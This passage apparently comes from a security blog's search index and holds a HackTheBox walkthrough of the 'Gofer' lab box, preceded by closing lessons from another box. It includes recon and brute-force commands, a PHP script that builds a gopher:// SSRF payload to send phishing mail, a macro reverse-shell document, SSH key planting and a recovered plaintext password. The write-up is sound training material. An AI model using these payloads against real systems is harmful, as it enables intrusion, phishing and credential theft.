Never rely on the integrity of the client application. The download app&rsquo;s /home endpoint was vulnerable for one simple reason: it relied on the frontend / client-side application providing a properly structured &ldquo;user&rdquo; object. Since it did no server-side validation or sanitization on that input, it was vulnerable to an any object with &ldquo;extra&rdquo; fields being included, such as adding a password field when the GET /home endpoint wasn&rsquo;t expecting anything other than id and username.
Set up proper permissions when acting as a system administrator. The exploit that was used to gain root access is well known, and relies on the root user logging in as a low privilege user to perform various actions. I am not suggesting that these actions like DB management all be performed by root - actually I&rsquo;m suggesting the opposite. Establish proper permissions for the appropriate user so everyone can do their job, with least privilege obeyed. Anything else is just lazy admin.
Further to the above point, the TTY Pushback / Hijacking exploit is easily preventable, and only needs a single line in the sudoers file to be changed. That being said, nobody knows everything, and asking that any admin knows every little exploit is simply too much to ask - that&rsquo;s why pentesters exist, after all &#x1f644;
Don&rsquo;t create bloated users. In my opinion, postgres should not have even had a home directory. It&rsquo;s just unnecessary. Realistically, postgres should have only had write access to a single folder, perhaps some &ldquo;backups&rdquo; folder, if anything. And plus, I&rsquo;m not a PostgreSQL expert, but I think they have separate permissions for that anyway.
`,url:"https://4wayhandshake.github.io/walkthrough/download/"},"https://4wayhandshake.github.io/walkthrough/gofer/":{title:"Gofer",tags:["SMB","SMTP","SSRF","Macro Exploit","Filter Bypass","Credential Re-use","Reverse Engineering","Use-after-free","Path Abuse"],categories:["Walkthrough","HTB","Linux","Hard"],content:`INTRODUCTION At the time of writing this walkthrough, this is Gofer is still active. It was released as the seventh box for HTB&rsquo;s Hackers Clash: Open Beta Season II. Gofer is labeled as a &ldquo;Hard&rdquo; Linux box, but in reality it was probably closer to medium difficulty. This box centers around a fictional company that provides web development and web design services, although, given the security breach you&rsquo;re about to dive into, perhaps they should transition to a different line of work. All in all, Gofer is very pleasant to run: the creator of the box clearly put great care into constructing a whole narrative and fictional context for the box. A little bit of enumeration, a few intelligent guesses, and a good knowledge of a few web tricks will gain you foothold
RECON nmap scans For this box, I&rsquo;m running the same enumeration strategy as the previous boxes in the Open Beta Season II. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan.txt $RADDR Nmap scan report for 10.10.11.225 Host is up (0.17s latency). Not shown: 65530 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 25/tcp filtered smtp 80/tcp open http 139/tcp open netbios-ssn 445/tcp open microsoft-ds Filtered smtp? That&rsquo;s notable. There&rsquo;s also SMB, SSH, and http
nmap -sV -sC -n -Pn -p22,25,80,139,445 -oN nmap/script-scan.txt $RADDR Nmap scan report for 10.10.11.225 Host is up (0.17s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 aa:25:82:6e:b8:04:b6:a9:a9:5e:1a:91:f0:94:51:dd (RSA) | 256 18:21:ba:a7:dc:e4:4f:60:d7:81:03:9a:5d:c2:e5:96 (ECDSA) |_ 256 a4:2d:0d:45:13:2a:9e:7f:86:7a:f6:f7:78:bc:42:d9 (ED25519) 25/tcp filtered smtp 80/tcp open http Apache httpd 2.4.56 |_http-title: Did not follow redirect to http://gofer.htb/ |_http-server-header: Apache/2.4.56 (Debian) 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb2-time: | date: 2023-07-31T10:54:43 |_ start_date: N/A |_clock-skew: -13s | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_nbstat: NetBIOS name: GOFER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) There&rsquo;s an http redirect to http://gofer.htb\`. Also, it looks like the OpenSSH they&rsquo;re using is a little out of date. Next, I did a slower port and script scan just to be sure I got everything (excuse the length):
sudo nmap -sV -sC -n -Pn --top-ports 4000 -oN nmap/top-4000-ports.txt $RADDR # No new results Webserver Strategy Noting the redirect from the nmap scan, I added gofer.htb to /etc/hosts and did banner grabbing on that domain:
echo &#34;$RADDR gofer.htb&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; DOMAIN=gofer.htb ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results from vhost enumeration of the base domain (gofer isn&rsquo;t in the wordlist). We know gofer.htb exists, so I&rsquo;ll check for vhosts under that as well:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.gofer.htb&#34; -c -t 60 -o fuzzing/vhost-gofer.md -of md -timeout 4 -ic -ac -v Ok, so proxy.gofer.htb is a result. I&rsquo;ll add that to my /etc/hosts file:
echo &#34;$RADDR proxy.gofer.htb&#34; | sudo tee -a /etc/hosts With that done, I&rsquo;ll move on to subdomain enumeration:
ffuf -w $WLIST -u http://FUZZ.$DOMAIN -c -t 60 -o fuzzing/subdomain.md -of md -timeout 4 -ic -ac -v # No new results Following my usual strategy, I proceeded with directory enumeration on http://gofer.htb:
Note: When I first ran directory enumeration, I got lots of nuisance 403 results with 20 words each, so those are filtered out in the following ffuf command
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e php,asp,js,html -timeout 4 -v -fw 20 Directory enumeration against http://gofer.htb/ gave the following:
Now let&rsquo;s try http://proxy.gofer.htb:
Note: When I first ran directory enumeration, I got lots of nuisance 403 results each with size of 462B or 280B, so those are filtered out in the following ffuf command
ffuf -w $WLIST:FUZZ -u http://proxy.$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 1 -c -o ffuf-directories-proxy -of json -e php,asp,js,html -timeout 4 -v -fs 462,280 # No results Exploring the Website The website itself looks like a very nice landing page for some business. It&rsquo;s a great template (I really like the Portfolio section!). Not much more than that though. There&rsquo;s a contact form, but it isn&rsquo;t connected to anything.
Aside from that, I also found http://proxy.gofer.htb. That site uses basic http authentication. If I don&rsquo;t find another way in, it might be worthwhile to brute-force this login &#x1f6a9;
SMB (TCP ports 139 &amp; 445) nmap --script &#34;safe or smb-enum-*&#34; -p 445 $RADDR Some less-useful results are omitted:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-31 17:12 IDT Pre-scan script results: | targets-asn: |_ targets-asn.asn is a mandatory parameter ... PORT STATE SERVICE 445/tcp open microsoft-ds |_smb-enum-services: ERROR: Script execution failed (use -d to debug) ... | smb-protocols: | dialects: | 2:0:2 | 2:1:0 | 3:0:0 | 3:0:2 |_ 3:1:1 | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required ... Try nmblookup:
nmblookup -A $RADDR Looking up status of 10.10.11.225 GOFER &lt;00&gt; - B &lt;ACTIVE&gt; GOFER &lt;03&gt; - B &lt;ACTIVE&gt; GOFER &lt;20&gt; - B &lt;ACTIVE&gt; ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; WORKGROUP &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; WORKGROUP &lt;1d&gt; - B &lt;ACTIVE&gt; WORKGROUP &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; MAC Address = 00-00-00-00-00-00 Try nbtscan:
nbtscan $RADDR/30 No useful result. How about running the nbtstat nmap script?
sudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n $RADDR PORT STATE SERVICE VERSION 137/udp open netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP) Service Info: Host: GOFER Host script results: | nbstat: NetBIOS name: GOFER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) | Names: | GOFER&lt;00&gt; Flags: &lt;unique&gt;&lt;active&gt; | GOFER&lt;03&gt; Flags: &lt;unique&gt;&lt;active&gt; | GOFER&lt;20&gt; Flags: &lt;unique&gt;&lt;active&gt; | \\x01\\x02__MSBROWSE__\\x02&lt;01&gt; Flags: &lt;group&gt;&lt;active&gt; | WORKGROUP&lt;00&gt; Flags: &lt;group&gt;&lt;active&gt; | WORKGROUP&lt;1d&gt; Flags: &lt;unique&gt;&lt;active&gt; |_ WORKGROUP&lt;1e&gt; Flags: &lt;group&gt;&lt;active&gt; Next I&rsquo;ll try enum4linux, which usually provides a lot of info:
enum4linux $RADDR [TODO: Make this into an collapsible block]
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jul 31 17:27:14 2023 =========================================( Target Information )========================================= Target ........... 10.10.11.225 RID Range ........ 500-550,1000-1050 Username ......... &#39;&#39; Password ......... &#39;&#39; Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ============================( Enumerating Workgroup/Domain on 10.10.11.225 )============================ [+] Got domain/workgroup name: WORKGROUP ================================( Nbtstat Information for 10.10.11.225 )================================ Looking up status of 10.10.11.225 GOFER &lt;00&gt; - B &lt;ACTIVE&gt; Workstation Service GOFER &lt;03&gt; - B &lt;ACTIVE&gt; Messenger Service GOFER &lt;20&gt; - B &lt;ACTIVE&gt; File Server Service ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Master Browser WORKGROUP &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Domain/Workgroup Name WORKGROUP &lt;1d&gt; - B &lt;ACTIVE&gt; Master Browser WORKGROUP &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Browser Service Elections MAC Address = 00-00-00-00-00-00 ===================================( Session Check on 10.10.11.225 )=================================== [+] Server 10.10.11.225 allows sessions using username &#39;&#39;, password &#39;&#39; ================================( Getting domain SID for 10.10.11.225 )================================ Domain Name: WORKGROUP Domain Sid: (NULL SID) [+] Can&#39;t determine if host is part of domain or part of a workgroup ===================================( OS information on 10.10.11.225 )=================================== [E] Can&#39;t get OS info with smbclient [+] Got OS info for 10.10.11.225 from srvinfo: GOFER Wk Sv PrQ Unx NT SNT Samba 4.13.13-Debian platform_id : 500 os version : 6.1 server type : 0x809a03 =======================================( Users on 10.10.11.225 )======================================= Use of uninitialized value $users in print at ./enum4linux.pl line 972. Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975. Use of uninitialized value $users in print at ./enum4linux.pl line 986. Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988. =================================( Share Enumeration on 10.10.11.225 )================================= smbXcli_negprot_smb1_done: No compatible protocol selected by server. Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers shares Disk IPC$ IPC IPC Service (Samba 4.13.13-Debian) Reconnecting with SMB1 for workgroup listing. protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE Unable to connect with SMB1 -- no workgroup available [+] Attempting to map shares on 10.10.11.225 //10.10.11.225/print$ Mapping: DENIED Listing: N/A Writing: N/A //10.10.11.225/shares Mapping: OK Listing: OK Writing: N/A [E] Can&#39;t understand response: NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\* //10.10.11.225/IPC$ Mapping: N/A Listing: N/A Writing: N/A ============================( Password Policy Information for 10.10.11.225 )============================ [+] Attaching to 10.10.11.225 using a NULL share [+] Trying protocol 139/SMB... [+] Found domain(s): [+] GOFER [+] Builtin [+] Password Info for Domain: GOFER [+] Minimum password length: 5 [+] Password history length: None [+] Maximum password age: 37 days 6 hours 21 minutes [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: None [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: 37 days 6 hours 21 minutes [+] Retieved partial password policy with rpcclient: Password Complexity: Disabled Minimum Password Length: 5 =======================================( Groups on 10.10.11.225 )======================================= [+] Getting builtin groups: [+] Getting builtin group memberships: [+] Getting local groups: [+] Getting local group memberships: [+] Getting domain groups: [+] Getting domain group memberships: ==================( Users on 10.10.11.225 via RID cycling (RIDS: 500-550,1000-1050) )================== [I] Found new SID: S-1-22-1 [I] Found new SID: S-1-5-32 [I] Found new SID: S-1-5-32 [I] Found new SID: S-1-5-32 [I] Found new SID: S-1-5-32 [+] Enumerating users using SID S-1-5-32 and logon username &#39;&#39;, password &#39;&#39; S-1-5-32-544 BUILTIN\\Administrators (Local Group) S-1-5-32-545 BUILTIN\\Users (Local Group) S-1-5-32-546 BUILTIN\\Guests (Local Group) S-1-5-32-547 BUILTIN\\Power Users (Local Group) S-1-5-32-548 BUILTIN\\Account Operators (Local Group) S-1-5-32-549 BUILTIN\\Server Operators (Local Group) S-1-5-32-550 BUILTIN\\Print Operators (Local Group) [+] Enumerating users using SID S-1-22-1 and logon username &#39;&#39;, password &#39;&#39; S-1-22-1-1000 Unix User\\jhudson (Local User) S-1-22-1-1001 Unix User\\jdavis (Local User) S-1-22-1-1002 Unix User\\tbuckley (Local User) S-1-22-1-1003 Unix User\\ablake (Local User) [+] Enumerating users using SID S-1-5-21-510552225-995404492-4015181936 and logon username &#39;&#39;, password &#39;&#39; S-1-5-21-510552225-995404492-4015181936-501 GOFER\\nobody (Local User) S-1-5-21-510552225-995404492-4015181936-513 GOFER\\None (Domain Group) ===============================( Getting printer info for 10.10.11.225 )=============================== No printers returned. enum4linux complete on Mon Jul 31 17:39:55 2023 Some important things to glean from this output are:
Users are jhudson, jdavis, tbuckley, ablake Groups are Administrators, Users, Guests, Power Users, Account Operators, Server Operators, and Print Operators. The SMB share shares can be explored. There are two domains: GOFER and WORKGROUP Correlating this with the website&rsquo;s Team section, we now know who is who:
tbuckley is Tom Buckley, the CTO jdavis is Jeff Davis, the CEO jhudson is Jocelyn Hudson, the product manager ablake is Amanda Blake, the accountant Next let&rsquo;s try connecting to the SMB shares, one of which is literally called &ldquo;shares&rdquo;:
smbclient //$RADDR/shares I provided an empty password:
Naturally, I downloaded the file: get mail.
This mail backup file seems like it holds a clue. Also a mention of the proxy I discovered earlier:
From jdavis@gofer.htb Fri Oct 28 20:29:30 2022 Return-Path: jdavis@gofer.htb X-Original-To: tbuckley@gofer.htb Delivered-To: tbuckley@gofer.htb Received: from gofer.htb (localhost [127.0.0.1]) by gofer.htb (Postfix) with SMTP id C8F7461827 for tbuckley@gofer.htb; Fri, 28 Oct 2022 20:28:43 +0100 (BST) Subject:Important to read! Message-Id: 20221028192857.C8F7461827@gofer.htb Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST) From: jdavis@gofer.htb
Hello guys,
Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That&rsquo;s why from now on, I&rsquo;ve decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.
PS: Last thing for Tom; I know you&rsquo;re working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via Some inferences to be made are:
Keep an eye out for Libreoffice Writer / .odt files. SMTP ID is C8F7461827 The web proxy is under construction and may be vulnerable. SMTP (TCP port 25) First, I&rsquo;ll banner-grab the SMTP server by contacting with nc:
nc -nv $RADDR 25 No result (probably because the port is filtered). I&rsquo;ll try nmap scripts just in case
nmap -p25 --script smtp-* $RADDR -v NSE: Loaded 9 scripts for scanning. ... Host is up (0.17s latency). PORT STATE SERVICE 25/tcp filtered smtp NSE: Script Post-scanning. Initiating NSE at 07:48 Completed NSE at 07:48, 0.00s elapsed Defeat Proxy Authentication I&rsquo;ll try getting through that simple http authentication that is required on http://proxy.gofer.htb. Since I already have a short list of usernames, I&rsquo;ll just run hydra with those usernames and rockyou for passwords:
cat knownusers.txt # ablake # jhudson # jdavis # tbuckley USERS=knownusers.txt PASSWDS=/usr/share/wordlists/rockyou.txt hydra -L $USERS -P $PASSWORDS -t 64 proxy.gofer.htb http-get &#34;/&#34; This will take a very long time (a few hours) to complete. If I had to bet, this isn&rsquo;t the correct route.
What about authentication bypass? First, are there any web tricks for getting past this authentication? I&rsquo;ll go through this Hacktricks page and see if anything works.
First, I&rsquo;ll try all the HTTP verbs against http://proxy.gofer.htb:
for T in \`echo &#34;GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK&#34; | sed &#39;s/,//g&#39;\`; do echo &#34;\\n\\nTrying $T\\n&#34;; curl -X $T http://proxy.gofer.htb; done No luck. What about trying that list of Headers provided in the Hacktricks page? I put all of the headers they mentioned into a text file, one line each, and looped through it:
while read H; do echo &#34;\\n\\nTrying $H\\n&#34;; curl http://proxy.gofer.htb -H &#34;$H&#34;; done &lt; headers.txt Alright, I&rsquo;ll try one of the automated tools then. I grabbed a copy of byp4xx and started running it. It was taking quite a while so I added a timeout and extra flags:
./byp4xx -m 1 -t 16 -xD http://proxy.gofer.htb No result. hmm&hellip;
While reading through this Hacktricks page (and the readme files of the tools it links to), I&rsquo;m realizing that a lot of these methods depend on requesting a specific page/resource. I&rsquo;ll try repeating what I already did, but check for an index page this time:
for E in &#34;/&#34; &#34;/index&#34; &#34;/index.html&#34; &#34;/index.php&#34;; do for T in \`echo &#34;GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK&#34; | sed &#39;s/,//g&#39;\`; do echo &#34;\\n\\nTrying $T $E\\n&#34;; curl -X $T &#34;http://proxy.gofer.htb$E&#34;; sleep 1; done; done; There were some interesting results:
... Trying OPTIONS /index.html &lt;!-- [this result was blank] --&gt; Trying POST /index.php &lt;!-- Welcome to Gofer proxy --&gt; &lt;html&gt;&lt;body&gt;Missing URL parameter !&lt;/body&gt;&lt;/html&gt; Trying PUT /index.php &lt;!-- Welcome to Gofer proxy --&gt; &lt;html&gt;&lt;body&gt;Missing URL parameter !&lt;/body&gt;&lt;/html&gt; Trying DELETE /index.php &lt;!-- Welcome to Gofer proxy --&gt; &lt;html&gt;&lt;body&gt;Missing URL parameter !&lt;/body&gt;&lt;/html&gt; ... Missing the URL parameter, eh? Alright, I&rsquo;ll stand up a local webserver, serving a simple index.html of my own.
sudo ufw allow from $RADDR to any port 8000 proto tcp python3 -m http.server 8000 curl -X POST http://proxy.gofer.htb/index.php?URL=http://10.10.14.8:8000/index.html &lt;!-- Welcome to Gofer proxy --&gt; &lt;html&gt;&lt;body&gt;Missing URL parameter !&lt;/body&gt;&lt;/html&gt; Ok, maybe they mean that it needs to be in the POST body?
curl --proxy 127.0.0.1:8080 -X POST http://proxy.gofer.htb/index.php --data-urlencode &#34;URL=http://10.10.14.8:8000/index.html&#34; Maybe they&rsquo;re careless with capitalization?
curl -X POST http://proxy.gofer.htb/index.php?url=http://10.10.14.8:8000/index.html &#x1f60e; That was it! The proxy is expecting a parameter in the form url=[request address]. It looks like my local webserver received that as a GET request:
Reading Files on the Target Now that I know the proxy can be used to relay GET requests, what we have is essentially an SSRF vulnerability. Maybe let&rsquo;s try grabbing a file with it?
Nope! It won&rsquo;t be that easy. What about something just a little more sneaky, like base64-encoded data?
Still nope. Other things I tried:
double url-encode file:// url-encode just a portion of file:// Caused a 408 Request timeout Put a null byte in the middle try a data:// url This keyword is also blacklisted Hmm&hellip; now every request is leading to a 408 Request Timeout. I wonder what has gone wrong. I&rsquo;ll let it sit for a while, and maybe reset the box later.
I&rsquo;ll try putting a file onto the server, just a test page. If this is successful, I&rsquo;ll try a PHP webshell or reverse shell too.
It didn&rsquo;t mention any error. But trying to navigate to the page shows that it was not successful. Trying the same thing with test.php has the same result.
FOOTHOLD SMTP over SSRF As shown in the nmap scans, SMTP on port 25 was filtered when accessing it from the outside. But now that I can bounce requests off of http://proxy.gofer.htb, maybe it will be possible to contact SMTP? I found a bug report for Imgur where a clever security researcher was exploiting a very similar vulnerability in Imgur&rsquo;s &ldquo;video-to-gif&rdquo; service. They managed to use Imgur&rsquo;s servers for several kinds of traffic over a very similar SSRF - including SMTP.
In their exploit, they crafted a malicious php file containing some SMTP commands to send an email, and a redirect header to use GOPHER protocol to send the SMTP commands to an upstream SMTP server, which would in turn send the email to the defined recipient.
The fact that they used GOPHER protocol seems like a big hint &#x1f440;
Roughly following the example they provided, I created a php file and hosted it from a python webserver running on my attacker machine:
&lt;?php $commands = array( &#39;HELO gofer.htb&#39;, &#39;MAIL FROM: &lt;tbuckley@gofer.htb&gt;&#39;, &#39;RCPT TO: &lt;jhudson@gofer.htb&gt;&#39;, &#39;DATA&#39;, &#39;Test mail &lt;a href=&#34;http://10.10.14.8:8000/clickme&#34;&gt;http://10.10.14.8:8000/clickme&lt;/a&gt;&#39;, &#39;.&#39; ); $payload = implode(&#39;%0A&#39;, $commands); header(&#39;Location: gopher://smtp.gofer.htb:25/_&#39;.$payload); ?&gt; But the big question now is&hellip; how will I know if it worked? And what does this even gain? It looks like there is a hint in that mail backup that I found earlier, about Jocelyn:
&ldquo;Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That&rsquo;s why from now on, I&rsquo;ve decided that important documents will only be sent internally, by mail&rdquo;
I wonder if the box is set up so that any mail sent to Jocelyn will have it&rsquo;s links clicked? I&rsquo;ll try including a link in the email. I wouldn&rsquo;t say it&rsquo;s very likely, but if I get a request to my python webserver running locally for GET /clickme, then I&rsquo;ll know it worked.
smtp.php is requested from my local python webserver, but /clickme is never requested. I think it&rsquo;s fair to say it did not work. Maybe &ldquo;Jocelyn&rdquo; knows to only open links to an .odt file? That might be the case, but first I need to craft a malicious .odt file containing some code that will let me know if it was opened.
LibreOffice Macro The best way to do this is to make a .odt file but also stick a macro inside. The macro should run whenever the document is opened, with no further interaction necessary. But first, the macro itself can be a simple reverse shell, but also with a wget to let me know if it ran. I tested this locally, then changed the isLocal variable to False. To open this window, I used Tools &gt; Macros &gt; Organize Macros &gt; Basic, added Module to the current document, then wrote the code:
Now that it&rsquo;s written, I just need to make it so the macro runs whenever the document opens. Close the macro editor window and go to Tools &gt; Macros &gt; Organize Macros &gt; Basic, then choose the macro and click Assign:
Assign it to the Event of Open Document:
I closed LibreOffice, started up a socat listener, then tried opening the memo.odt file I had just created. I caught the reverse shell and saw the request to /itworked arrive at my local webserver, so I think it works. However, I had to modify the LibreOffice security settings to allow macros to run, setting Macro security settings to Low. All I can do is hope that Jocelyn has already done this&#x1f91e;
In the case that the Macro Security setting is NOT set to &ldquo;low&rdquo;, there is a CVE that I might be able to exploit to get past this (It effective bypasses the certificate check that is used to tell if a macro is trusted or not).
To try testing this idea incrementally, I set up a netcat listener on port 4444 and tried the request shown on the hacktricks page. While the request timed out, I did get a hit at my netcat listener, and it looked like a properly formed SMTP request. In this request, I&rsquo;m basically using a copy-paste of the payload shown on the SSRF Hacktricks page for gopher:
Alright, that seemed mildly successful&hellip; Let&rsquo;s try adapting it to be more specific to what is needed for this box:
Great. It&rsquo;s now addressed to Jocelyn, from Tom. Also, it contains a link to the memo.odt document. If all goes according to plan, Jocelyn will &ldquo;click&rdquo; it.
Huh? Now the box is trolling me? &#x1f61e; This attempt is largely based on the SSRF page on Hacktricks, but with a little workaround to avoid the blacklisted &ldquo;/127&rdquo;:
I don&rsquo;t like all of this double url-encoding. Plus, editing the payload inside Burp is not very fun. I&rsquo;ll go back the the PoC in the Imgur bug report and write the construction of the request into a php script. However, I&rsquo;ll change one aspect: As shown on the Hacktricks SSRF page, there is no need to have the payload wrapped inside a Location header; I can simply include it as part of the url parameter.
Here is the PHP script that assembles the payload. This payload is just for testing, so I&rsquo;m directing the &ldquo;smtp&rdquo; request at my own machine&rsquo;s socat listener on port 4444 (could have done a nc listener or a tcpdump for this purpose, too):
&lt;?php $addr = &#34;10.10.14.4:4444&#34;; $localaddr = &#34;http://10.10.14.4:8000/memo.odt&#34;; $commands = array( &#39;HELO gofer.htb&#39;, &#39;MAIL FROM: &lt;tbuckley@gofer.htb&gt;&#39;, &#39;RCPT TO: &lt;jhudson@gofer.htb&gt;&#39;, &#39;DATA&#39;, &#39;Subject: Important memo&#39;, &#39;Please urgenetly read the memo: &lt;a href=&#34;&#39; . $localaddr . &#39;&#34;&gt; &#39; . $localaddr . &#39; &lt;/a&gt;&#39;, &#39;.&#39; ); $payload = implode(&#39;%0A&#39;, $commands); echo &#34;gopher://&#34; . $addr . &#34;/_&#34; . urlencode($payload); ?&gt; To improve consistency between attempts at deploying this payload, I started up a simple PHP server and utilize this script within the curl command to deploy the payload:
php -S 127.0.0.1:8001 curl --proxy 127.0.0.1:8080 -X POST http://proxy.gofer.htb/index.php?url=\`curl localhost:8001/smtp.php\` From my socat listener, I see the result. Looks good so far &#x1f44d;
Now, I&rsquo;ll change the target address in the PHP script, send the command and hope for the best!
$addr = &#34;0.0.0.0:25&#34;; $localaddr = &#34;http://10.10.14.4:8000/memo.odt&#34;; &#x1f635; WHAT! It actually worked! After about a minute of waiting, it seems like Jocelyn &ldquo;clicked&rdquo; the link, and my macro worked:
This was the successful request:
For copy-pasting: this was the url parameter:
gopher://0.0.0.0:25/_HELO+gofer.htb%250AMAIL+FROM%3A+%3Ctbuckley%40gofer.htb%3E%250ARCPT+TO%3A+%3Cjhudson%40gofer.htb%3E%250ADATA%250ASubject%3A+Important+memo%250APlease+urgenetly+read+the+memo%3A+%3Ca+href%3D%22http%3A%2F%2F10.10.14.4%3A8000%2Fmemo.odt%22%3E+http%3A%2F%2F10.10.14.4%3A8000%2Fmemo.odt+%3C%2Fa%3E%250A. USER FLAG Upgrade the Shell First things first, let&rsquo;s upgrade this shell:
SHELL=/bin/bash script -q /dev/null [ ctrl + z ] stty raw -echo; fg [ enter enter ] export TERM=xterm-256color The initial prompt showed that jhudson has mail. I checked it, but it&rsquo;s just a single blank line. Maybe a remnant of my exploit? Maybe related to the way that the box has scripted jhudson to check their mail and &ldquo;click&rdquo; a link? I don&rsquo;t know.
Grab the Flag Let&rsquo;s see who has the flag:
cd /home find . -type f -name &#34;user.txt # ./jhudson/user.txt # find: ‘./tbuckley/.local/share’: Permission denied Great! Jocelyn has the flag. Simply cat it out for the points:
cat /home/jhudson/user.txt SSH Access This shell I have as jhudson is good. Command history, tab completion, colors - it&rsquo;s really quite nice! But since my internet access is a little flaky, I&rsquo;d like to see if I can use SSH instead. I&rsquo;ll try planting a key into jhudson. First, on the attacker machine, generate a key and get the base-64 encoded version of the pubkey:
ssh-keygen -t rsa -b 4096 # called it jhudson_id_rsa and used password &#34;password&#34; chmod 700 jhudson_id_rsa base64 -w 0 jhudson_id_rsa.pub &gt; jhudson_id_rsa.pub64 cat jhudson_id_rsa.pub64 # [ copy the output to clipboard ] Then on the target machine, as jhudson, put the key into authorized_keys
mkdir /home/jhudson/.ssh echo &#34;[ paste ]&#34; | base64 -d &gt; /home/jhudson/.ssh/authorized_keys Then from the attacker machine, log in using the key that was generated:
Excellent! Now I don&rsquo;t have to bother with the exploit again if I lose my connection &#x1f352;
ROOT FLAG User Enumeration: jhudson I&rsquo;ll follow my usual Linux User Enumeration strategy. To keep this walkthrough as brief as possible, I&rsquo;ll omit the actual procedure of user enumeration, and instead just jot down any meaningful results / findings.
sudo is not present.
Some useful programs present on the box are: nc, netcat, curl, wget, python3, perl, php
netstat -tulpn did not identify any services not previously known, but it did show that there are other listening processes that jhudson does not have access to.
There is a notable SUID binary: -rwsr-s--- 1 root dev 17168 Apr 28 16:06 /usr/local/bin/notes
Pspy found a cron-scheduled process running: Linpeas found some neat things too:
Can sniff SMTP using tcpdump (Maybe credential re-use?)
gdb was found on the PATH
/proc/sys/kernel/yama/ptrace_scope is enabled (0) means I can run ptrace on binary!
Found an Apache password hash: /etc/apache2/.htpasswd:$apr1$YcZb9OIz$fRzQMx20VskXgmH65jjLh/
This is probably the proxy password
-rw-r--r-- 1 root root 47 Nov 3 2022 /etc/apache2/.htpasswd tbuckley:$apr1$YcZb9OIz$fRzQMx20VskXgmH65jjLh/ However, pspy already found this credential: tbuckley : ooP4dietie3o_hquaeti
Also flagged that SUID binary as unknown: -rwsr-s--- 1 root dev 17K Apr 28 16:06 /usr/local/bin/notes (Unknown SUID binary)
There&rsquo;s something odd about write as well: I&rsquo;ll check the easy stuff first. I&rsquo;ll verify the proxy.gofer.htb password that was recovered. Then, maybe tbuckley got lazy and re-used their proxy.gofer.htb credential for ssh (which would be really bad, because it was transmitted over http in plaintext!)
Yup! The credential works for http://proxy.gofer.htb, so there&rsquo;s no point in cracking that Apache .htpasswd hash. Now let&rsquo;s check for credential re-use:
Tom!!! You should not be CTO! &#x1f631;
Super! Tom&rsquo;s SSH credential is verified: tbuckley : ooP4dietie3o_hquaeti
User Enumeration: tbuckley Since tbuckley is the CTO, it&rsquo;s likely that he has more privileges than jhudson. Again, I&rsquo;ll omit the actual procedure of user enumeration, and instead just record any meaningful results / findings.
still no sudo available.
tbuckley is in special group: 1004(dev)
The only file that belongs to dev is that suspicious SUID binary: /usr/local/bin/notes &#x1f6a9;
&#x1f4a1; I think the way forward is pretty clear: I need to use gdb to use this notes binary to escalate privilege
tbuckley has access to nc, netcat, curl, wget, python3, perl, php
